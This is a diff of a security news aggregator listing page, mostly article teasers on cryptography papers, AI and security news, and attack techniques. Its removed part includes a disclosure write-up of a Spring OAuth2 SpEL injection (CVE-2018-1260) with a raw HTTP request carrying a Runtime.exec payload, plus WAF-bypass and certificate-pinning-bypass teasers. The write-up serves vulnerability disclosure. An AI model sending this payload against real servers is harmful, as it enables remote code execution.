@@ -40,291 +40,184 @@
 		
 		
 			<article>
-	<h1><a href="https://ghariib.ir/posts/beware-of-the-magic-spell-part-2-cve-2018-1260/">Beware of the Magic SpEL(L) – Part 2 (CVE-2018-1260)</a></h1>
+	<h1><a href="https://ghariib.ir/posts/a-journey-into-the-beauty-of-dnsrebinding-part-2/">A Journey Into the Beauty of DNSRebinding - Part 2</a></h1>
 	<b><time>22.01.2025 00:00</time></b>
 	
 	<div>
-		<p>
-<figure>
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_EUzFEi_nPDSoSmzQz_gG5EAxsJ9oNtznOCZZYlHG72s1iAwFp8hyphenhyphentAOX2e2WEQwpNXHJIJwkV5tU7UA8G3dAufDqByKehkteiObXhtL5yu6MCcNbIB9059VWSa8o6V8SphkdpDnzZD58/s320/spring-oauth2.png" alt="" />
-</figure>
-
-
-</p>
-<p>On Tuesday, we released the details of RCE vulnerability affecting Spring Data (CVE-2018-1273). We are now repeating the same exercise for a similar RCE vulnerability in Spring Security OAuth2 (CVE-2018-1260). We are going to present the attack vector, its discovery method and the conditions required for exploitation. This vulnerability also has similarities with another vulnerability disclosed in 2016. The resemblance will be discussed in the section where we review the fix.</p>
-<h2 id="analyzing-a-potential-vulnerability">Analyzing a potential vulnerability</h2>
-<p>It all started by the report of the bug pattern SPEL_INJECTION by Find Security Bugs. It reported the use of <code>SpelExpressionParser.parseExpression()</code> with a dynamic parameter, the same API used in the previous vulnerability we had found. The expression parser is used to parse expressions placed between curly brackets &ldquo;${&hellip;}&rdquo;.</p>
-<pre tabindex="0"><code>public SpelView(String template) {
-    this.template = template;
-    this.prefix = new RandomValueStringGenerator().generate() + &#34;{&#34;;
-    this.context.addPropertyAccessor(new MapAccessor());
-    this.resolver = new PlaceholderResolver() {
-        public String resolvePlaceholder(String name) {
-            Expression expression = parser.parseExpression(name); //Expression parser
-            Object value = expression.getValue(context);
-            return value == null ? null : value.toString();
-        }
-    };
-}
-</code></pre><p>The controller class <code>WhitelabelApprovalEndpoint</code> uses this SpelView class to build the approval page for OAuth2 authorization flow. The SpelView class evaluates the string named &ldquo;template&rdquo; - see code below - as a Spring Expression.</p>
-<pre tabindex="0"><code>@RequestMapping(&#34;/oauth/confirm_access&#34;)
-public ModelAndView getAccessConfirmation(Map&lt;String, Object&gt; model, HttpServletRequest request) throws Exception {
-   String template = createTemplate(model, request);
-   if (request.getAttribute(&#34;_csrf&#34;) != null) {
-      model.put(&#34;_csrf&#34;, request.getAttribute(&#34;_csrf&#34;));
-   }
-   return new ModelAndView(new SpelView(template), model); //template variable is a SpEL
-}
-</code></pre><p>Following the methods createTemplate() and createScopes(), we can see that the attribute &ldquo;scopes&rdquo; is appended to the HTML template which will be evaluated as an expression. The only model parameter bound to the template is a CSRF token. However, the CSRF token will not be under the control of a remote user.</p>
-<pre tabindex="0"><code>protected String createTemplate(Map&lt;String, Object&gt; model, HttpServletRequest request) {
-   String template = TEMPLATE;
-   if (model.containsKey(&#34;scopes&#34;) || request.getAttribute(&#34;scopes&#34;) != null) { 
-      template = template.replace(&#34;%scopes%&#34;, createScopes(model, request)).replace(&#34;%denial%&#34;, &#34;&#34;);
-   }
-
-[...]
-
-private CharSequence createScopes(Map&lt;String, Object&gt; model, HttpServletRequest request) {
-   StringBuilder builder = new StringBuilder(&#34;&lt;ul&gt;&#34;);
-   @SuppressWarnings(&#34;unchecked&#34;)
-   Map&lt;String, String&gt; scopes = (Map&lt;String, String&gt;) (model.containsKey(&#34;scopes&#34;) ? model.get(&#34;scopes&#34;) : request
-         .getAttribute(&#34;scopes&#34;));  //Scope attribute loaded here
-   for (String scope : scopes.keySet()) {
-      String approved = &#34;true&#34;.equals(scopes.get(scope)) ? &#34; checked&#34; : &#34;&#34;;
-      String denied = !&#34;true&#34;.equals(scopes.get(scope)) ? &#34; checked&#34; : &#34;&#34;;
-      String value = SCOPE.replace(&#34;%scope%&#34;, scope).replace(&#34;%key%&#34;, scope).replace(&#34;%approved%&#34;, approved)
-            .replace(&#34;%denied%&#34;, denied);
-      builder.append(value);
-   }
-   builder.append(&#34;&lt;/ul&gt;&#34;);
-   return builder.toString();
-}
-</code></pre><p>At this point, we are unsure if the scopes attribute can be controlled by the remote user. While attribute (req.getAttribute(..)) represents session values stored server-side, scope is an optional parameter part of OAuth2 flow. The parameter might be accessible to the user, saved to the server-side attributes and finally loaded into the previous template.<br>
-After some research in the documentation and some manual tests, we found that &ldquo;scope&rdquo; is a GET parameter part of the implicit OAuth2 flow. Therefore, the implicit mode would be required for our vulnerable application.</p>
-<h2 id="proof-of-concept-and-limitations">Proof-of-Concept and Limitations</h2>
-<p>When testing our application, we realized that the scopes were validated against a scopes whitelist defined by the user/client. If this whitelist is configured, we can&rsquo;t be creative with the parameter scope. If the scopes are simply not defined, no validation is applied to the name of the scopes. This limitation will likely make most Spring OAuth2 applications safe.<br>
-This first request made used the scope &ldquo;${1338-1}&rdquo;, see picture below. Based on the response, we now have a confirmation that the scope parameter&rsquo;s value can reach the SpelView expression evaluation. We can see in the resulting HTML multiples instances of the string &ldquo;scope.1337&rdquo;.</p>
-<table>
-  <thead>
-      <tr>
-          <th>
-<figure>
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBRxeuEyK1xwqLTgdDIig_VdsmEXGIMU-LEc2sW9Yaajyh8hS7Sv83fPZDkywg5OZLXRwNZOQWMXJv2L_fjQwwH4z1scj71gmVB7vmcFCdFFpcAJJYrWBkev9bhGJN_5O6y88BdzyAvO8Q/s640/spel1.png" alt="" />
-</figure>
-
-
-</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>Pushing the probe value ${1338-1}</td>
-      </tr>
-  </tbody>
-</table>
-<p>A second test was made using the expression &ldquo;${T(java.lang.Runtime).getRuntime().exec(&ldquo;calc.exe&rdquo;)}&rdquo; to verify that the expressions are not limited to simple arithmetic operations.</p>
-<table>
-  <thead>
-      <tr>
-          <th>
-<figure>
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguUEbrAlV3kvr9fkscJPJfiqZDa5L-iOJonbTGMoeMfhC6E-HUA9tq1ayX5vBFWTYrs15cfx9QajcIwBtuOmpshdW6j5FmI1mlc1gst5grv8qoFTM1I7EbwyY9qeg7Dmj8MTJ3peC7h-Sf/s640/spel2.png" alt="" />
-</figure>
-
-
-</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>Simple proof-of-concept request spawning a calc.exe subprocess</td>
-      </tr>
-  </tbody>
-</table>
-<p>For easier reproduction, here is the raw HTTP request from the previous screenshot. Some characters - mainly curly brackets - were not supported by the web container and needed to be URL encoded in order to reach the application. { -&gt; %7b</p>
-<pre tabindex="0"><code>POST /oauth/authorize?response_type=code&amp;client_id=client&amp;username=user&amp;password=user&amp;grant_type=password&amp;scope=%24%7bT(java.lang.Runtime).getRuntime().exec(%22calc.exe%22)%7d&amp;redirect_uri=http://csrf.me HTTP/1.1
-Host: localhost:8080
-Authorization: Bearer 1f5e6d97-7448-4d8d-bb6f-4315706a4e38
-Content-Type: application/x-www-form-urlencoded
-Accept: */*
-Content-Length: 0
-</code></pre><h2 id="reviewing-the-fix">Reviewing The Fix</h2>
-<p>The solution chosen by the Pivotal team was to replace SpelView with a simpler view, with basic concatenation. This eliminates all possible paths to a SpEL evaluation. The first patch proposed introduced a potential XSS vulnerability, but luckily this was spotted before any release was made. The scope values are now properly escaped and free from any injection.<br>
-More importantly, this solution improved the security of another endpoint: WhitelabelErrorEndpoint. The endpoint is also no longer uses a Spel View. It was found vulnerable to an identical attack vector in 2016. Spring-OAuth2 also used the SpelView class to build the error page. The interesting twist is that the template parameter was static, but the parameters bound to the template were evaluated recursively. This means that any value in the model could lead to a Remote Code Execution.</p>
-		
-			<a href="https://ghariib.ir/posts/beware-of-the-magic-spell-part-2-cve-2018-1260/">Read more...</a>
-		
-	</div>
-</article>
-
-		
-			<article>
-	<h1><a href="https://ghariib.ir/posts/bringing-multiple-windows-to-flutter-desktop-apps/">Bringing multiple windows to Flutter desktop apps</a></h1>
-	<b><time>22.01.2025 00:00</time></b>
-	
-	<div>
-		<p>Over the past 5 years, Canonical has been contributing to Flutter, including building out Linux support for Flutter applications, publishing libraries to help integrate into the Linux desktop and building modern applications for Ubuntu, including our software store. Last year we announced at the Ubuntu Summit that we’ve been working on bringing support for multiple windows to Flutter desktop apps.</p>
+		<h4 id="heading">**</h4>
 <p>
 <figure>
-  <img src="https://res.cloudinary.com/canonical/image/fetch/f_auto,q_auto,fl_sanitize,c_fill,w_1568,h_1600/https://ubuntu.com/wp-content/uploads/94a6/image.png" alt="" />
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFUbwqScaadVAeGqh3JSxLZaH936SBrNxYcarxTAfoYRcIIQ_JkbhqxYQL8JweFLYA3rtyNpQJw5shaJuNyzQ0V2BHSJvSdwPG18x0__WARFFboPLK3Bbx2Wytckpk73VP82HW9ghG861B/s0/DNS_2.jpg" alt="" />
 </figure>
 
 
 </p>
-<h2 id="why-multiple-windows-support-for-flutter-desktop-apps-is-needed">Why multiple windows support for Flutter desktop apps is needed</h2>
-<p>One current limitation that Flutter desktop apps have is that they are confined to a single window. This makes sense on mobile where an app takes up the whole screen but for Flutter desktop apps there’s much more space to take advantage of. We know that many members of the Flutter community – including us here at Canonical – have been waiting patiently to break out of that single window.</p>
+<p>**</p>
+<h4 id="abstract"><strong>Abstract</strong></h4>
+<p>In the first part, after a fast overview on the <em>DNS Rebinding</em> technique, we considered a practical example in which UPnP services has been exploited to perform NAT Injection attacks and, therefore, expose internal services on Internet.</p>
+<p>In this second post we are going to demonstrate how <em>DNS Rebinding</em> could be used to exploit vulnerable services running locally in order to achieve Remote Code Execution (RCE). </p>
 		
-			<a href="https://ghariib.ir/posts/bringing-multiple-windows-to-flutter-desktop-apps/">Read more...</a>
-		
-	</div>
-</article>
-
-		
-			<article>
-	<h1><a href="https://ghariib.ir/posts/browserstack-and-bitrise-partner-to-help-mobile-developers-build-test-and-release-apps-faster-with-confidence-bitrise-blog/">BrowserStack and Bitrise partner to help mobile developers build, test and release apps faster with confidence - Bitrise Blog</a></h1>
-	<b><time>22.01.2025 00:00</time></b>
-	
-	<div>
-		<p>Bitrise is partnering with BrowserStack to improve your mobile DevOps experience, giving access to best-in-class mobile-first CI/CD and automated mobile device testing, plus an incredible free product offer.</p>
-<p>Go to Source</p>
+			<a href="https://ghariib.ir/posts/a-journey-into-the-beauty-of-dnsrebinding-part-2/">Read more...</a>
 		
 	</div>
 </article>
 
 		
 			<article>
-	<h1><a href="https://ghariib.ir/posts/bypassing-certificate-pinning-on-flutter-based-android-apps-a-new-guide/">Bypassing Certificate Pinning on Flutter-based Android Apps. A new guide.</a></h1>
+	<h1><a href="https://ghariib.ir/posts/a-survey-on-transciphering-and-symmetric-ciphers-for-homomorphic-encryption/">A Survey on Transciphering and Symmetric Ciphers for Homomorphic Encryption</a></h1>
 	<b><time>22.01.2025 00:00</time></b>
 	
-	<a href="/tags/certificate-pinning">certificate-pinning</a>
-	
-	<a href="/tags/flutter">flutter</a>
-	
-	<a href="/tags/reverse-engineering">reverse-engineering</a>
-	
-	<div>
-		<p>
-<figure>
-  <img src="https://blogger.googleusercontent.com/img/a/AVvXsEiLZOgVn35LqPDpfHUk6wcqLOjrvV6JioR2CPitS6-4WhuB6jSaudX8wXAwTaHk3U7ebucLS-R5vO6GRTF2dC-cjzUcm-qv1IQLhkB-zDUYLavj06fTkgqAbwsix1lSP2klyN8rqETtdsCcQFAv_FOKE9AGSNQ0TOyi3q5sxBSkyE_lhziAZbmO1DDnroxg" alt="" />
-</figure>
-
-
-</p>
-<p>One of the preliminary activities when analyzing mobile application, <em>more usually than not</em>, is to be able to sniff HTTP/S traffic via <strong>a MitM proxy</strong>. </p>
-<p>This is quite straightforward in the case of naive applications, but can be quite challenging when applications use certificate pinning techniques. In this post I&rsquo;ll try to explain the methodology I used to make this possible for a <strong>Flutter-based</strong> <strong>Android</strong> sample application in a reliable way.</p>
-		
-			<a href="https://ghariib.ir/posts/bypassing-certificate-pinning-on-flutter-based-android-apps-a-new-guide/">Read more...</a>
-		
-	</div>
-</article>
-
-		
-			<article>
-	<h1><a href="https://ghariib.ir/posts/bypassing-modsecurity-waf/">Bypassing ModSecurity WAF</a></h1>
-	<b><time>22.01.2025 00:00</time></b>
-	
-	<a href="/tags/libinjection">libinjection</a>
-	
-	<a href="/tags/modsecurity">modsecurity</a>
-	
-	<a href="/tags/mysql">mysql</a>
-	
-	<a href="/tags/waf">waf</a>
-	
-	<div>
-		<p>Being able to bypass Web Application Firewall (WAF) depends on your knowledge about their behavior. Here is a cool technique that involve <strong>expressions that are ignored in MySQL SQL parser</strong> (MySQL &lt;= 5.7). This post summarizes the impact on libinjection. The libinjection library is used by WAF such as ModSecurity and SignalScience. For more details on AWS Cloudfront impact, read the original GoSecure article.</p>
-<p>
-<figure>
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPVnidYg-zDcbocWT8PLVe-A3XzqWbXSUIOdIu3iFJMr5MSMm9yFg3hsyGDbuWrpqbgrpUj9XY2JyIdgNJv50IlUdIgeIHjNmBjqVYz8Vz8YO-e3toUt6Bd_Dwf9etJAumCHr8Mq89KQGT/s16000/s1bwt2caxl3q8m5d3rdc%255B1%255D.jpg" alt="" />
-</figure>
-
-
-</p>
-<h2 id="scientific-expression-in-mysql">Scientific expression in MySQL</h2>
-<p>When MySQL sees <code>1.e(abc)</code>, it will ignore the <code>1.e(</code> portion because the following characters do not form a valid numeric value.</p>
-		
-			<a href="https://ghariib.ir/posts/bypassing-modsecurity-waf/">Read more...</a>
-		
-	</div>
-</article>
-
-		
-			<article>
-	<h1><a href="https://ghariib.ir/posts/cis-control-05-account-management/">CIS Control 05: Account Management</a></h1>
-	<b><time>22.01.2025 00:00</time></b>
-	
-	<div>
-		<p>Knowing who has credentials, how those credentials are granted, and how they are being used is the foundation of any secure environment. It begins with user accounts and the credentials they use. Maintaining a thorough inventory of all accounts and verifying any changes to those accounts as authorized and intentional vs unintended is paramount to establishing a secure environment, and this includes service accounts. Establishing and maintaining visibility on all accounts can protect assets in multiple ways. If an adversary is able to attack from a different vector that we do not have any&hellip;</p>
-		
-			<a href="https://ghariib.ir/posts/cis-control-05-account-management/">Read more...</a>
-		
-	</div>
-</article>
-
-		
-			<article>
-	<h1><a href="https://ghariib.ir/posts/cisa-releases-three-industrial-control-systems-advisories/">CISA Releases Three Industrial Control Systems Advisories</a></h1>
-	<b><time>22.01.2025 00:00</time></b>
-	
-	<div>
-		<p>CISA released three Industrial Control Systems (ICS) advisories on January 21, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.</p>
-<ul>
-<li>ICSA-25-021-01 Traffic Alert and Collision Avoidance System (TCAS) II</li>
-<li>ICSA-25-021-02 Siemens SIMATIC S7-1200 CPUs</li>
-<li>ICSA-25-021-03 ZF Roll Stability Support Plus (RSSPlus)</li>
-</ul>
-<p>CISA encourages users and administrators to review newly released ICS advisories for technical details and mitigations.</p>
-<p>Go to Source</p>
-		
-	</div>
-</article>
-
-		
-			<article>
-	<h1><a href="https://ghariib.ir/posts/creating-a-custom-view-for-websocket-in-zap/">Creating A Custom View for WebSocket in ZAP</a></h1>
-	<b><time>22.01.2025 00:00</time></b>
-	
-	<a href="/tags/pentesting">pentesting</a>
-	
-	<a href="/tags/plugin">plugin</a>
-	
-	<a href="/tags/websocket">websocket</a>
-	
-	<a href="/tags/zap">zap</a>
-	
-	<div>
-		<p>
-<figure>
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbETbc1fXDey2o7NC3ZLEq1k5hZCqEoEpz4lzxWVtKG6ansPGEuxnVY7LV1Xm_5A3G8-jtvQgT16MtRSi-_y3AdyshZ_wi7yGDHzP8yn0a0iwo-k3z1JEDsPAHxie17ohTSnkf-uv-s1UD/s320/websocket-in-zap-image-feature%255B1%255D.png" alt="" />
-</figure>
-
-
-</p>
-<p>When we were looking at the interactions between the Outlook and the LinkedIn APIs, we encountered WebSocket communications that used some additional encoding. The encoding was nothing too complex, but it was uncommon. It turned out to be LZip compression. However, the inability to read the content of the requests with Burp, ZAP or Web developer consoles in real-time made it difficult to analyze the API.</p>
-<p>While our proxy of choice is usually Burp Suite, it did not allow us to extend WebSocket views. We turn ourselves to the open-source project Zed Attack Proxy. It reveals to be easily extendable for custom WebSocket tooling. In this blog post, we will explain how you can implement your own custom view to display complex WebSocket messages.</p>
-		
-			<a href="https://ghariib.ir/posts/creating-a-custom-view-for-websocket-in-zap/">Read more...</a>
-		
-	</div>
-</article>
-
-		
-			<article>
-	<h1><a href="https://ghariib.ir/posts/cve-2023-37777-synnefo-internet-management-software-sql-injection-vulnerability/">CVE-2023-37777 - Synnefo Internet Management Software SQL Injection Vulnerability</a></h1>
-	<b><time>22.01.2025 00:00</time></b>
-	
-	<a href="/tags/cve">cve</a>
-	
-	<a href="/tags/cybersecurity">cybersecurity</a>
+	<a href="/tags/cryptography">cryptography</a>
 	
 	<a href="/tags/security">security</a>
 	
 	<div>
-		<p><strong>CVE ID :</strong> CVE-2023-37777<br>
-<strong>Published :</strong> Jan. 22, 2025, 4:15 p.m. | 14 minutes ago<br>
-<strong>Description :</strong> Synnefo Internet Management Software 2023 was discovered to contain a SQL injection vulnerability.<br>
-<strong>Severity:</strong> 0.0 | NA<br>
-Visit the link for more details, such as CVSS details, affected products, timeline, and more&hellip;</p>
+		<p>ePrint Report: <strong>A Survey on Transciphering and Symmetric Ciphers for Homomorphic Encryption</strong><br>
+<em>Indranil Thakur, Angshuman Karmakar, Chaoyun Li, Bart Preneel</em></p>
+<p>Data privacy concerns are sharply rising in the current digital era, hyperdriven by cloud computing, big data analytics, and the Internet of Things. Homomorphic Encryption (HE) has emerged as an ideal technique for computing on encrypted data, but current schemes suffer from slow encryption speed and large ciphertext expansion. Practical implementation is hindered, especially when the client has limited bandwidth, memory, and computing power. In 2011, Naehrig et al. proposed transciphering, reducing computational and communication overload on the client side. This involves symmetric ciphers with minimized multiplicative complexity, referred to as HE-Friendly Ciphers (HEFCs).</p>
+		
+			<a href="https://ghariib.ir/posts/a-survey-on-transciphering-and-symmetric-ciphers-for-homomorphic-encryption/">Read more...</a>
+		
+	</div>
+</article>
+
+		
+			<article>
+	<h1><a href="https://ghariib.ir/posts/adaptive-hardcore-bit-and-quantum-key-leasing-over-classical-channel-from-lwe-with-polynomial-modulus/">Adaptive Hardcore Bit and Quantum Key Leasing over Classical Channel from LWE with Polynomial Modulus</a></h1>
+	<b><time>22.01.2025 00:00</time></b>
+	
+	<a href="/tags/cryptography">cryptography</a>
+	
+	<a href="/tags/security">security</a>
+	
+	<div>
+		<p>ePrint Report: <strong>Adaptive Hardcore Bit and Quantum Key Leasing over Classical Channel from LWE with Polynomial Modulus</strong><br>
+<em>Duong Hieu Phan, Weiqiang Wen, Xingyu Yan, Jinwei Zheng</em></p>
+<p>Quantum key leasing, also known as public key encryption with secure key leasing (PKE-SKL), allows a user to lease a (quantum) secret key to a server for decryption purpose, with the capability of revoking the key afterwards. In the pioneering work by Chardouvelis et al (arXiv:2310.14328), a PKE-SKL scheme utilizing classical channels was successfully built upon the noisy trapdoor claw-free (NTCF) family. This approach, however, relies on the superpolynomial hardness of learning with errors (LWE) problem, which could affect both efficiency and security of the scheme.</p>
+		
+			<a href="https://ghariib.ir/posts/adaptive-hardcore-bit-and-quantum-key-leasing-over-classical-channel-from-lwe-with-polynomial-modulus/">Read more...</a>
+		
+	</div>
+</article>
+
+		
+			<article>
+	<h1><a href="https://ghariib.ir/posts/ai-predictions-for-2025-a-cyber-security-experts-perspective/">AI Predictions for 2025: A Cyber Security Expert’s Perspective</a></h1>
+	<b><time>22.01.2025 00:00</time></b>
+	
+	<div>
+		<p>
+<figure>
+  <img src="https://blog.checkpoint.com/wp-content/uploads/2025/01/Dan-v.1-e1737134156825.jpg" alt="" />
+</figure>
+
+
+</p>
+<p>As we approach 2025, the rapid evolution of artificial intelligence (AI) is set to dramatically reshape the cyber security landscape. As an AI and cyber security expert, I foresee several key developments that will significantly impact our digital world. The surge in AI usage will have far-reaching implications for areas such as energy consumption, software development, and ethical and legal frameworks. Of course, AI technologies will also be weaponized by cyber criminals and nation state actors, creating new and formidable threats to cyber security. The AI Explosion The adoption of AI technologies is accelerating at an unprecedented rate. ChatGPT, for […]</p>
+		
+			<a href="https://ghariib.ir/posts/ai-predictions-for-2025-a-cyber-security-experts-perspective/">Read more...</a>
+		
+	</div>
+</article>
+
+		
+			<article>
+	<h1><a href="https://ghariib.ir/posts/ai-tool-geospy-analyzes-images-and-identifies-locations-in-seconds/">AI tool GeoSpy analyzes images and identifies locations in seconds</a></h1>
+	<b><time>22.01.2025 00:00</time></b>
+	
+	<div>
+		<p>It’s just become even more important to be conscious about the pictures we post online.</p>
+<p>GeoSpy is an Artificial Intelligence (AI) supported tool that can derive a person’s location by analyzing features in a photo like vegetation, buildings, and other landmarks. And it can do so in seconds based on one picture.</p>
+<p>Graylark Technologies who makes GeoSpy says it’s been developed for government and law enforcement. But the investigative journalists from 404 Media report that the tool has also been used for months by members of the public, with many making videos marveling at the technology, and some asking for help with stalking specific women.</p>
+		
+			<a href="https://ghariib.ir/posts/ai-tool-geospy-analyzes-images-and-identifies-locations-in-seconds/">Read more...</a>
+		
+	</div>
+</article>
+
+		
+			<article>
+	<h1><a href="https://ghariib.ir/posts/ais-market-value-to-exceed-1-5-trillion-in-2025-what-this-means-for-cybersecurity/">AI’s Market Value To Exceed $1.5 Trillion In 2025. What This Means For Cybersecurity.</a></h1>
+	<b><time>22.01.2025 00:00</time></b>
+	
+	<div>
+		<h6 id="this-week-in-cybersecurity-from-the-editors-at-cybercrime-magazine"><em>This week in cybersecurity from the editors at Cybercrime Magazine</em></h6>
+<p><em>
+<figure>
+  <img src="http://cybersecurityventures.com/wp-content/uploads/2020/09/icon-rss.png" alt="" />
+</figure>
+
+
+–Read the Full Story in DailyFT</em></p>
+<p>Sausalito, Calif. – Jan. 21, 2025</p>
+<p>With cybercrime costs projected to reach an astronomical $10.5 trillion annually by 2025, according to Cybersecurity Ventures, the stakes have never been higher.</p>
+<p>DailyFT, Sri Lanka’s first and only national daily business paper, reports that AI’s market value is expected to surpass $ 1.5 trillion within the same timeframe, underlining its growing dominance in every industry. This convergence represents a dual-edged sword: while AI offers unprecedented capabilities for detecting, preventing, and mitigating cyber threats, it also equips malicious actors with new tools for sophisticated attacks.</p>
+		
+			<a href="https://ghariib.ir/posts/ais-market-value-to-exceed-1-5-trillion-in-2025-what-this-means-for-cybersecurity/">Read more...</a>
+		
+	</div>
+</article>
+
+		
+			<article>
+	<h1><a href="https://ghariib.ir/posts/an-introduction-to-protein-cryptography/">An Introduction to Protein Cryptography</a></h1>
+	<b><time>22.01.2025 00:00</time></b>
+	
+	<a href="/tags/cryptography">cryptography</a>
+	
+	<a href="/tags/security">security</a>
+	
+	<div>
+		<p>ePrint Report: <strong>An Introduction to Protein Cryptography</strong><br>
+<em>Hayder Tirmazi, Tien Phuoc Tran</em></p>
+<p>We introduce protein cryptography, a recently proposed method that encodes data into the amino acid sequences of proteins. Unlike traditional digital encryption, this approach relies on the inherent diversity, complexity, and replication resistance of biological macromolecules, making them highly secure against duplication or tampering. The experimental realization of protein cryptography remains an open problem. To accelerate experimental progress in this area, we provide an accessible and self-contained introduction to the fundamentals of cryptography for biologists with limited mathematical and computational backgrounds. Furthermore, we outline a framework for encoding, synthesizing, and decoding information using proteins. By enabling biologists to actively engage in the development of protein cryptography, this work bridges disciplinary boundaries and paves the way for applications in secure data storage.</p>
+		
+			<a href="https://ghariib.ir/posts/an-introduction-to-protein-cryptography/">Read more...</a>
+		
+	</div>
+</article>
+
+		
+			<article>
+	<h1><a href="https://ghariib.ir/posts/anomaly-detection-in-time-series/">Anomaly Detection in Time Series</a></h1>
+	<b><time>22.01.2025 00:00</time></b>
+	
+	<a href="/tags/dev">dev</a>
+	
+	<a href="/tags/developers">developers</a>
+	
+	<a href="/tags/development">development</a>
+	
+	<a href="/tags/jetbrains">jetbrains</a>
+	
+	<a href="/tags/linux">linux</a>
+	
+	<a href="/tags/software">software</a>
+	
+	<div>
+		<p>How do you identify unusual patterns in data that might reveal critical issues or hidden opportunities? Anomaly detection helps identify data that deviates significantly from the norm. Time series data, which consists of data collected over time, often includes trends and seasonal patterns. Anomalies in time series data occur when these patterns are disrupted, making […]</p>
+<p>
+<figure>
+  <img src="https://blog.jetbrains.com/wp-content/uploads/2025/01/pc-featured_blog_1280x720_en-4.png" alt="Anomaly Detection in Time Series" />
+</figure>
+
+
+</p>
+<p>How do you identify unusual patterns in data that might reveal critical issues or hidden opportunities? Anomaly detection helps identify data that deviates significantly from the norm. Time series data, which consists of data collected over time, often includes trends and seasonal patterns. Anomalies in time series data occur when these patterns are disrupted, making anomaly detection a valuable tool in industries like sales, finance, manufacturing, and healthcare.</p>
+		
+			<a href="https://ghariib.ir/posts/anomaly-detection-in-time-series/">Read more...</a>
+		
+	</div>
+</article>
+
+		
+			<article>
+	<h1><a href="https://ghariib.ir/posts/apple-anniversaries-and-possible-new-apple-products-for-2025-intego-mac-podcast-379/">Apple Anniversaries, and Possible New Apple Products for 2025 – Intego Mac Podcast 379</a></h1>
+	<b><time>22.01.2025 00:00</time></b>
+	
+	<div>
+		<p>We discuss January anniversaries for some of our favorite Apple gear, and then a look at what new devices Apple may be planning to introduce during the year.</p>
+<p>The post Apple Anniversaries, and Possible New Apple Products for 2025 – Intego Mac Podcast 379 appeared first on The Mac Security Blog.</p>
 <p>Go to Source</p>
 		
 	</div>
@@ -332,22 +225,19 @@ Visit the link for more details, such as CVSS details, affected products, timeli
 
 		
 			<article>
-	<h1><a href="https://ghariib.ir/posts/cve-2024-10929-arm-cortex-a72-a73-a75-branch-history-manipulation-vulnerability/">CVE-2024-10929 - Arm Cortex-A72/A73/A75 Branch History Manipulation Vulnerability</a></h1>
+	<h1><a href="https://ghariib.ir/posts/artificial-results-from-hardware-synthesis/">Artificial Results From Hardware Synthesis</a></h1>
 	<b><time>22.01.2025 00:00</time></b>
 	
-	<a href="/tags/cve">cve</a>
-	
-	<a href="/tags/cybersecurity">cybersecurity</a>
+	<a href="/tags/cryptography">cryptography</a>
 	
 	<a href="/tags/security">security</a>
 	
 	<div>
-		<p><strong>CVE ID :</strong> CVE-2024-10929<br>
-<strong>Published :</strong> Jan. 22, 2025, 4:15 p.m. | 14 minutes ago<br>
-<strong>Description :</strong> In certain circumstances, an issue in Arm Cortex-A72 (revisions before r1p0), Cortex-A73 and Cortex-A75 may allow an adversary to gain a weak form of control over the victim&rsquo;s branch history.<br>
-<strong>Severity:</strong> 0.0 | NA<br>
-Visit the link for more details, such as CVSS details, affected products, timeline, and more&hellip;</p>
-<p>Go to Source</p>
+		<p>ePrint Report: <strong>Artificial Results From Hardware Synthesis</strong><br>
+<em>Ahmed Alharbi, Charles Bouillaguet</em></p>
+<p>In this paper, we revisit venerable lower-bounds on the $AT$ or $AT^2$ performance metric of hardware circuits. A series of works started in the late 1970&rsquo;s has established that if a hardware circuit of area $A$ computes a function $f : {0, 1}^n rightarrow {0, 1}^m$ in $T$ clock cycles, then $AT^2$ is asymptotically larger than (a form of) the communication complexity of $f$. These lower-bounds ignore the active component of the circuit such as the logic gates and only take into account the area of the wiring.</p>
+		
+			<a href="https://ghariib.ir/posts/artificial-results-from-hardware-synthesis/">Read more...</a>
 		
 	</div>
 </article>
@@ -357,7 +247,7 @@ Visit the link for more details, such as CVSS details, affected products, timeli
 
 	<a href="/page/179/">Previous Page</a>
 
-180 of 554
+180 of 556
 
 	<a href="/page/181/">Next Page</a>
 
